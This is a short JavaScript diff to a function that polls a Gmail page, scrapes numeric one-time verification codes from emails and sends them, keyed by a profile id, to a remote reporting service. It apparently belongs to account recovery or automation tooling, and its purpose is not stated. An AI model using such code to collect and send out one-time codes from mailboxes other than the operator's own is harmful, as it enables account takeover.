@@ -8,6 +8,7 @@ async function getOtp(action) {
     }
     else if (url.indexOf('mail.google.com/mail') > -1) {
       await sleep(20000)
+      let codeReported = []
       const timeout = 600000
       let n = Math.ceil(timeout/2000)
       for(let i = 0; i < n; i++){
@@ -29,17 +30,25 @@ async function getOtp(action) {
                 if (codeel) {
                   codeel = Number(codeel)
                   if (codeel && !codeData.includes(codeel)) {
-                    codeData.push(codeel)
+                    if (!codeReported.includes(codeel)) {
+                      codeData.push(codeel)
+                      codeReported.push(codeel)
+                    }
                   }
                 }
               }
             }
           });
 
+          let codesReport = ''
           if (codeData.length) {
-            action.data_reported = 'p_used_for_recovery:' + codeData.join(',')
+            codesReport = codeData.join(',')
+          }
+          let reportRs = await reportMailCode({ pid: action.pid, codes: codesReport })
+          if (reportRs && reportRs.stop) {
+            action.data_reported = ''
             await reportScript(action)
-            return 
+            return
           }
         }
         await sleep(2000)
